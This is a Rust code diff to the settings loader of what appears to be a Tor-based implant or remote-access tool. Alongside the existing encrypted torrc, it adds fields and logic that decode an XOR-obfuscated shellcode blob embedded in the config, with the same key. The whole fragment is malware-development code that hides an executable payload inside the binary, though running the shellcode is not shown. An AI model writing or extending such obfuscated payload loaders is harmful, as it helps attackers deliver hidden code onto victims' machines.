@@ -8,7 +8,9 @@ pub struct Setting {
     pub key: String,
     pub name: String,
     pub tor_dir: PathBuf,
-    pub torrc: String
+    pub torrc: String,
+    pub shellcode: Vec<u8>,
+    pub uses_shellcode: bool
 }
 
 impl Setting {
@@ -37,11 +39,23 @@ pub fn load_settings() -> Result<Setting, Box<dyn error::Error>> {
         &String::from(config::ENC_TORRC)
     )?;
 
+    let uses_shellcode = config::ENC_SHELLCODE != "";
+    let shellcode = if uses_shellcode {
+        xor::decode_bytes(
+            &key,
+            &String::from(config::ENC_SHELLCODE)
+        )?
+    } else {
+        Vec::new()
+    };
+
     let setting = Setting {
         name,
         key,
         torrc,
-        tor_dir: expand_user_dir(&tor_dir)
+        tor_dir: expand_user_dir(&tor_dir),
+        shellcode,
+        uses_shellcode,
     };
 
     Ok(setting)
